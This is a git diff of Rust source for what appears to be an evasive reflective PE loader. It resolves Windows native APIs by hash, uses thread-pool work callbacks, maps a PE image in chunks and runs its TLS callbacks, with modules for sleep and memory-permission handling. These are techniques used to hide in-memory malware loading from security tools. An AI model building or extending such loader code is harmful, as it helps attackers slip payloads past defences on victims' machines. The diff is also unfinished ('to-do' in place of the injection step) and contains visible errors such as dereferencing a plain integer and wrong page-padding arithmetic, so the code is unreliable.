@@ -40,6 +40,7 @@ pub use windows_sys::{
                     CONTEXT
                 }
             },
+            Memory::PAGE_READONLY,
             WindowsProgramming::CLIENT_ID
         },
         Foundation::{
@@ -52,14 +53,15 @@ pub use windows_sys::{
         }
     }
 };
+use crate::api_hashing::get_function_address;
+use crate::callback::nt_alloc_args;
 
 mod api_hashing;
 mod reloc;
 mod fix_iat;
-mod memory_perms;
+mod fix_memory_perms;
 mod callback;
 mod sleep;
-mod Inject;
 
 pub const TP_ALLOC_WORK_HASH: u32 = 0xB8CF6EF3;
 pub const TP_POST_WORK_HASH: u32 = 0x8F4BD5EE;
@@ -98,16 +100,27 @@ pub unsafe extern "system" fn ClementineInit(pe_address: *mut c_void, kernel32_a
     #[cfg(target_arch = "x86")]
         let nt_header = (base_address + (*(base_address as *mut IMAGE_DOS_HEADER)).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
 
+    /*
+     *  Inject the PE in chunks
+     *  If loaded at it's preferred address, skip relocation
+     */
+
     let pe_size = (*nt_header).OptionalHeader.SizeOfImage as usize;
-    let pe_preferred_address = (*nt_header).OptionalHeader.ImageBase as usize;
+    let pe_preferred_address = (*nt_header).OptionalHeader.ImageBase as *mut c_void;
 
-    /* Call the function which injects PE in chunks.
-       If loaded at it's preferred address, skip relocation and IAT reparation
-    */
+    let nt_alloc_ptr: usize = get_function_address(ntdll_address, NT_ALLOC_HASH).unwrap();
 
-    // ...
+    let padded_pe_size: usize = pe_size + 4096 & !4096;
+    let mut alloc = nt_alloc_args { function_pointer: nt_alloc_ptr ,
+        process: -1,
+        address: pe_preferred_address,
+        size: *pe_size,
+        permissions: PAGE_READONLY
+    };
 
-    /* Execute TLS callbacks, if they exist */
+    // to-do
+
+    // Execute TLS callbacks, if they exist
     if !(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize].Size {
         #[cfg(target_arch = "x86_64")]
             let image_tls_directory = (base_address + (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize].VirtualAddress as usize) as *mut IMAGE_TLS_DIRECTORY64;
